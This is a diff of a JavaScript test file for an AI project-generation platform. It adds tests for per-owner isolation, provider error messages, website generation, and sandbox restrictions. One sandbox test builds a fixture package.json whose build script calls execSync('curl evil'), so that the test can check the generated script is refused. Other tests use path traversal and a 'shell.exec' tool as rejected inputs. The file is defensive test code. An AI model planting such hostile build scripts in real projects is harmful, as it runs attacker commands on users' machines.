@@ -13,11 +13,15 @@ const {
   validatePlan,
 } = require('../.test-build/lib/agent/openai-provider.js');
 const { allowRequest, cancelTask, createTask, getTask, recordApproval, transitionTask } = require('../.test-build/lib/agent/task-store.js');
+const { getRequestOwnerId } = require('../.test-build/lib/auth.js');
 const { executeTool, hasPermission } = require('../.test-build/lib/agent/tools.js');
 const {
   createProject,
   createProjectTask,
   getProject,
+  getProjectForOwner,
+  getProjectTaskForOwner,
+  exportProjectFiles,
   recordProjectCheck,
   readProjectFile,
   reserveProjectRepair,
@@ -43,6 +47,14 @@ const generatedProject = {
   tasks: ['Add a greeting module'],
   files: [{ path: 'src/index.ts', content: 'export const greeting = "hello";\n' }],
 };
+const ownerA = 'a'.repeat(64);
+const ownerB = 'b'.repeat(64);
+
+test('request authentication accepts only middleware-provided opaque owner IDs', () => {
+  assert.equal(getRequestOwnerId(new Request('https://example.test', { headers: { 'x-tinan-owner-id': ownerA } })), ownerA);
+  assert.equal(getRequestOwnerId(new Request('https://example.test')), null);
+  assert.equal(getRequestOwnerId(new Request('https://example.test', { headers: { 'x-tinan-owner-id': 'user@example.com' } })), null);
+});
 
 test('demo is the explicit default and provider configuration requires server credentials', () => {
   assert.equal(getProviderMode({}), 'demo');
@@ -100,6 +112,14 @@ test('provider failures and invalid provider plans fail closed', async () => {
     createModelPlan('objective', [], undefined, validEnv, async () => new Response('', { status: 429 })),
     /rate limiting/,
   );
+  await assert.rejects(
+    createModelPlan('objective', [], undefined, validEnv, async () => new Response('', { status: 402 })),
+    /insufficient credits/,
+  );
+  await assert.rejects(
+    createModelPlan('objective', [], undefined, validEnv, async () => new Response('', { status: 401 })),
+    /rejected its credentials/,
+  );
   assert.throws(
     () => validatePlan({ summary: 'bad', requiresApproval: false, steps: [{ title: 'run shell', description: '', permission: 'TEST', tool: { name: 'shell.exec', arguments: {} } }] }),
     /unsupported tool/,
@@ -131,7 +151,7 @@ test('provider requests enforce the configured timeout', async () => {
 
 test('tool permissions reject unregistered tools and require TEST for test proposals', async () => {
   assert.equal(hasPermission('READ', 'TEST'), false);
-  const task = createTaskRecord('tool-test', 'propose checks', 'openai-compatible', []);
+  const task = createTaskRecord('tool-test', 'propose checks', 'openai-compatible', [], ownerA);
   const context = { task, workspaceRoot: process.cwd() };
   const rejected = await executeTool({ name: 'tests.propose', arguments: {} }, 'READ', context);
   const unknown = await executeTool({ name: 'shell.exec', arguments: {} }, 'FINANCIAL', context);
@@ -149,7 +169,7 @@ test('file reading requires explicit authorization and rejects traversal and sym
     await writeFile(path.join(root, 'notes.txt'), 'authorized');
     await writeFile(path.join(outside, 'secret.txt'), 'not authorized');
     await symlink(path.join(outside, 'secret.txt'), path.join(root, 'link.txt'));
-    const task = createTaskRecord('file-test', 'read notes', 'openai-compatible', ['notes.txt', 'link.txt', '../secret.txt']);
+    const task = createTaskRecord('file-test', 'read notes', 'openai-compatible', ['notes.txt', 'link.txt', '../secret.txt'], ownerA);
     const context = { task, workspaceRoot: root };
     assert.equal((await executeTool({ name: 'files.read', arguments: { path: 'notes.txt' } }, 'READ', context)).status, 'completed');
     assert.equal((await executeTool({ name: 'files.read', arguments: { path: 'link.txt' } }, 'READ', context)).status, 'rejected');
@@ -163,19 +183,21 @@ test('file reading requires explicit authorization and rejects traversal and sym
 });
 
 test('task state transitions reject invalid moves and support approval and cancellation', () => {
-  const task = createTaskRecord('state-test', 'test transitions', 'demo', []);
+  const task = createTaskRecord('state-test', 'test transitions', 'demo', [], ownerA);
   createTask(task);
+  assert.equal(require('../.test-build/lib/agent/task-store.js').getTaskForOwner(task.id, ownerB), undefined);
   assert.equal(getTask(task.id).status, 'planning');
   transitionTask(task.id, 'awaiting_approval', 'Needs review.');
-  recordApproval(task.id, true);
+  recordApproval(task.id, true, ownerA);
   transitionTask(task.id, 'executing', 'Approved.');
   transitionTask(task.id, 'completed', 'Finished.');
   assert.throws(() => transitionTask(task.id, 'executing', 'Invalid reversal.'), /Invalid task transition/);
 
-  const cancelled = createTaskRecord('cancel-test', 'cancel me', 'demo', []);
+  const cancelled = createTaskRecord('cancel-test', 'cancel me', 'demo', [], ownerA);
   createTask(cancelled);
-  assert.equal(cancelTask(cancelled.id).status, 'cancelled');
+  assert.equal(cancelTask(cancelled.id, ownerA).status, 'cancelled');
   assert.equal(getTask(cancelled.id).status, 'cancelled');
+  assert.equal(cancelTask(cancelled.id, ownerB), undefined);
 });
 
 test('process-local task rate limiter rejects bursts and expires old requests', () => {
@@ -189,7 +211,7 @@ test('process-local task rate limiter rejects bursts and expires old requests', 
 
 test('demo planning never selects tools and identifies sensitive goals', async () => {
   const safePlan = createDemoPlan('Organize a project');
-  const task = createTaskRecord('demo-test', 'Plan a mainnet deployment', 'demo', []);
+  const task = createTaskRecord('demo-test', 'Plan a mainnet deployment', 'demo', [], ownerA);
   createTask(task);
   await planTask(task);
   assert.equal(safePlan.steps.every((step) => step.tool === null), true);
@@ -216,9 +238,12 @@ test('project workspaces are isolated, readable, exportable, and rollback genera
   const previousRoot = process.env.TINAN_PROJECTS_DIR;
   process.env.TINAN_PROJECTS_DIR = root;
   try {
-    const first = await createProject(generatedProject);
-    const second = await createProject({ ...generatedProject, name: 'Another Project', files: [{ path: 'src/index.ts', content: 'other\n' }] });
+    const first = await createProject(generatedProject, ownerA);
+    const second = await createProject({ ...generatedProject, name: 'Another Project', files: [{ path: 'src/index.ts', content: 'other\n' }] }, ownerB);
     assert.notEqual(first.id, second.id);
+    assert.equal((await getProjectForOwner(first.id, ownerB)), undefined);
+    assert.equal((await getProjectForOwner(first.id, ownerA)).id, first.id);
+    assert.deepEqual((await require('../.test-build/lib/builder/project-store.js').listProjects(ownerA)).map((project) => project.id), [first.id]);
     assert.equal(await readProjectFile(first.id, 'src/index.ts'), generatedProject.files[0].content);
     assert.equal(await readProjectFile(second.id, 'src/index.ts'), 'other\n');
     await assert.rejects(readProjectFile(first.id, '../package.json'), /not permitted/);
@@ -257,22 +282,22 @@ test('project generation uses the configured provider, reports failure, and supp
   process.env.TINAN_AI_API_KEY = 'server-test-key';
   process.env.TINAN_AI_MODEL = 'test-model';
   try {
-    const task = createProjectTask('Create a starter', 'generation');
+    const task = createProjectTask('Create a starter', ownerA, 'generation');
     await runProjectGeneration(task, async () => generatedProject);
     assert.equal(task.status, 'completed');
     assert.ok(task.projectId);
     assert.equal((await getProject(task.projectId)).files.length, 1);
 
-    const failed = createProjectTask('fail generation', 'generation');
+    const failed = createProjectTask('fail generation', ownerA, 'generation');
     await runProjectGeneration(failed, async () => { throw new Error('Provider unavailable.'); });
     assert.equal(failed.status, 'failed');
     assert.match(failed.errors[0], /Provider unavailable/);
 
-    const repairProject = await createProject(generatedProject);
+    const repairProject = await createProject(generatedProject, ownerA);
     await recordProjectCheck(repairProject.id, 'build', 'failed', 'Build failed.');
     const reserved = await reserveProjectRepair(repairProject.id);
     assert.equal(reserved.repairAttempts, 1);
-    const repair = createProjectTask('Repair one failed build.', 'repair', repairProject.id);
+    const repair = createProjectTask('Repair one failed build.', ownerA, 'repair', repairProject.id);
     await runProjectGeneration(repair, async () => ({
       ...generatedProject,
       files: [{ path: 'src/index.ts', content: 'export const greeting = "repaired";\n' }],
@@ -281,12 +306,12 @@ test('project generation uses the configured provider, reports failure, and supp
     assert.match(await readProjectFile(repairProject.id, 'src/index.ts'), /repaired/);
     await assert.rejects(reserveProjectRepair(repairProject.id), /already been used/);
 
-    const cancelled = createProjectTask('cancel generation', 'generation');
+    const cancelled = createProjectTask('cancel generation', ownerA, 'generation');
     const pending = runProjectGeneration(cancelled, (_requirements, signal) => new Promise((_resolve, reject) => {
       signal.addEventListener('abort', () => reject(new Error('aborted')), { once: true });
     }));
     const { cancelProjectTask } = require('../.test-build/lib/builder/project-store.js');
-    cancelProjectTask(cancelled.id);
+    cancelProjectTask(cancelled.id, ownerA);
     await pending;
     assert.equal(cancelled.status, 'cancelled');
   } finally {
@@ -303,8 +328,57 @@ test('project generation uses the configured provider, reports failure, and supp
   }
 });
 
+test('mocked OpenRouter website generation validates, isolates, and exports real source files', async () => {
+  const root = await mkdtemp(path.join(os.tmpdir(), 'tinan-website-project-'));
+  const previousRoot = process.env.TINAN_PROJECTS_DIR;
+  process.env.TINAN_PROJECTS_DIR = root;
+  const websiteRequirements = [
+    'Create a minimal responsive sample services website.',
+    'Include a homepage, responsive layout, header/navigation, hero section, services section, and footer.',
+    'Return actual source files; do not execute shell commands.',
+  ].join(' ');
+  const website = {
+    name: 'Sample Services',
+    specification: 'Responsive static sample services website.',
+    technology: ['HTML', 'CSS'],
+    tasks: ['Create semantic homepage sections', 'Add responsive styles'],
+    files: [
+      { path: 'index.html', content: '<!doctype html><html><body><header><nav>Home Services</nav></header><main><section class="hero"><h1>Services made simple</h1></section><section><h2>Our services</h2></section></main><footer>Contact</footer></body></html>' },
+      { path: 'styles.css', content: 'body{margin:0;font-family:sans-serif}.hero{padding:4rem} @media(max-width:600px){.hero{padding:2rem}}' },
+    ],
+  };
+  try {
+    const generated = await generateProject(
+      websiteRequirements,
+      undefined,
+      validEnv,
+      async (_url, options) => {
+        const requestBody = JSON.parse(options.body);
+        assert.equal(requestBody.model, validEnv.TINAN_AI_MODEL);
+        assert.match(requestBody.messages[1].content, /responsive layout/);
+        return new Response(JSON.stringify({ choices: [{ message: { content: JSON.stringify(website) } }] }), { status: 200 });
+      },
+    );
+    const project = await createProject(generated, ownerA);
+    assert.equal(await readProjectFile(project.id, 'index.html'), website.files[0].content);
+    assert.equal(await readProjectFile(project.id, 'styles.css'), website.files[1].content);
+    const deniedProject = await getProjectForOwner(project.id, ownerB);
+    assert.equal(deniedProject, undefined);
+    const archive = createProjectArchive(await exportProjectFiles(project.id).then((result) => result.files));
+    const archiveContents = gunzipSync(archive).toString('utf8');
+    assert.match(archiveContents, /index\.html/);
+    assert.match(archiveContents, /styles\.css/);
+    assert.match(archiveContents, /Services made simple/);
+    assert.match(archiveContents, /@media/);
+  } finally {
+    if (previousRoot === undefined) delete process.env.TINAN_PROJECTS_DIR;
+    else process.env.TINAN_PROJECTS_DIR = previousRoot;
+    await rm(root, { recursive: true, force: true });
+  }
+});
+
 test('sandbox never falls back to host commands when Docker image is not digest-pinned', async () => {
-  const task = createProjectTask('', 'check');
+  const task = createProjectTask('', ownerA, 'check');
   const previousImage = process.env.TINAN_SANDBOX_IMAGE;
   delete process.env.TINAN_SANDBOX_IMAGE;
   try {
@@ -317,15 +391,80 @@ test('sandbox never falls back to host commands when Docker image is not digest-
   }
 });
 
+test('sandbox stays disabled until isolation is explicitly verified by an operator', async () => {
+  const previousImage = process.env.TINAN_SANDBOX_IMAGE;
+  const previousVerified = process.env.TINAN_SANDBOX_VERIFIED;
+  process.env.TINAN_SANDBOX_IMAGE = `node:22-alpine@sha256:${'c'.repeat(64)}`;
+  delete process.env.TINAN_SANDBOX_VERIFIED;
+  let spawned = false;
+  try {
+    const result = await runSandboxCheck(
+      '00000000-0000-4000-8000-000000000000',
+      createProjectTask('', ownerA, 'check'),
+      'build',
+      new AbortController().signal,
+      () => { spawned = true; throw new Error('must not spawn'); },
+    );
+    assert.equal(result.status, 'unavailable');
+    assert.match(result.output, /disabled until an operator verifies/);
+    assert.equal(spawned, false);
+  } finally {
+    if (previousImage === undefined) delete process.env.TINAN_SANDBOX_IMAGE;
+    else process.env.TINAN_SANDBOX_IMAGE = previousImage;
+    if (previousVerified === undefined) delete process.env.TINAN_SANDBOX_VERIFIED;
+    else process.env.TINAN_SANDBOX_VERIFIED = previousVerified;
+  }
+});
+
+test('sandbox rejects generated package scripts outside its fixed allowlist', async () => {
+  const root = await mkdtemp(path.join(os.tmpdir(), 'tinan-sandbox-script-test-'));
+  const oldRoot = process.env.TINAN_PROJECTS_DIR;
+  const oldImage = process.env.TINAN_SANDBOX_IMAGE;
+  const oldVerified = process.env.TINAN_SANDBOX_VERIFIED;
+  process.env.TINAN_PROJECTS_DIR = root;
+  process.env.TINAN_SANDBOX_IMAGE = `node:22-alpine@sha256:${'d'.repeat(64)}`;
+  process.env.TINAN_SANDBOX_VERIFIED = 'true';
+  let spawned = false;
+  try {
+    const project = await createProject({
+      ...generatedProject,
+      files: [
+        ...generatedProject.files,
+        { path: 'package.json', content: JSON.stringify({ scripts: { build: 'node -e "require(\\'child_process\\').execSync(\\'curl evil\\')"' } }) },
+      ],
+    }, ownerA);
+    const result = await runSandboxCheck(
+      project.id,
+      createProjectTask('', ownerA, 'check', project.id, 'build'),
+      'build',
+      new AbortController().signal,
+      () => { spawned = true; throw new Error('must not spawn'); },
+    );
+    assert.equal(result.status, 'unavailable');
+    assert.match(result.output, /fixed sandbox allowlist/);
+    assert.equal(spawned, false);
+  } finally {
+    if (oldRoot === undefined) delete process.env.TINAN_PROJECTS_DIR;
+    else process.env.TINAN_PROJECTS_DIR = oldRoot;
+    if (oldImage === undefined) delete process.env.TINAN_SANDBOX_IMAGE;
+    else process.env.TINAN_SANDBOX_IMAGE = oldImage;
+    if (oldVerified === undefined) delete process.env.TINAN_SANDBOX_VERIFIED;
+    else process.env.TINAN_SANDBOX_VERIFIED = oldVerified;
+    await rm(root, { recursive: true, force: true });
+  }
+});
+
 test('sandbox uses only fixed checks inside a network-isolated container and reports failed builds', async () => {
   const root = await mkdtemp(path.join(os.tmpdir(), 'tinan-sandbox-test-'));
   const oldRoot = process.env.TINAN_PROJECTS_DIR;
   const oldImage = process.env.TINAN_SANDBOX_IMAGE;
+  const oldVerified = process.env.TINAN_SANDBOX_VERIFIED;
   process.env.TINAN_PROJECTS_DIR = root;
   process.env.TINAN_SANDBOX_IMAGE = `node:22-alpine@sha256:${'a'.repeat(64)}`;
+  process.env.TINAN_SANDBOX_VERIFIED = 'true';
   try {
-    const project = await createProject(generatedProject);
-    const task = createProjectTask('', 'check', project.id, 'build');
+    const project = await createProject(generatedProject, ownerA);
+    const task = createProjectTask('', ownerA, 'check', project.id, 'build');
     let invocation;
     const result = await runSandboxCheck(project.id, task, 'build', new AbortController().signal, (command, args, options) => {
       invocation = { command, args, options };
@@ -350,6 +489,8 @@ test('sandbox uses only fixed checks inside a network-isolated container and rep
     else process.env.TINAN_PROJECTS_DIR = oldRoot;
     if (oldImage === undefined) delete process.env.TINAN_SANDBOX_IMAGE;
     else process.env.TINAN_SANDBOX_IMAGE = oldImage;
+    if (oldVerified === undefined) delete process.env.TINAN_SANDBOX_VERIFIED;
+    else process.env.TINAN_SANDBOX_VERIFIED = oldVerified;
     await rm(root, { recursive: true, force: true });
   }
 });
@@ -358,11 +499,13 @@ test('sandbox cancellation terminates the check and reports cancellation', async
   const root = await mkdtemp(path.join(os.tmpdir(), 'tinan-sandbox-cancel-'));
   const oldRoot = process.env.TINAN_PROJECTS_DIR;
   const oldImage = process.env.TINAN_SANDBOX_IMAGE;
+  const oldVerified = process.env.TINAN_SANDBOX_VERIFIED;
   process.env.TINAN_PROJECTS_DIR = root;
   process.env.TINAN_SANDBOX_IMAGE = `node:22-alpine@sha256:${'b'.repeat(64)}`;
+  process.env.TINAN_SANDBOX_VERIFIED = 'true';
   try {
-    const project = await createProject(generatedProject);
-    const task = createProjectTask('', 'check', project.id, 'test');
+    const project = await createProject(generatedProject, ownerA);
+    const task = createProjectTask('', ownerA, 'check', project.id, 'test');
     const controller = new AbortController();
     let wasKilled = false;
     let spawned;
@@ -389,6 +532,8 @@ test('sandbox cancellation terminates the check and reports cancellation', async
     else process.env.TINAN_PROJECTS_DIR = oldRoot;
     if (oldImage === undefined) delete process.env.TINAN_SANDBOX_IMAGE;
     else process.env.TINAN_SANDBOX_IMAGE = oldImage;
+    if (oldVerified === undefined) delete process.env.TINAN_SANDBOX_VERIFIED;
+    else process.env.TINAN_SANDBOX_VERIFIED = oldVerified;
     await rm(root, { recursive: true, force: true });
   }
 });
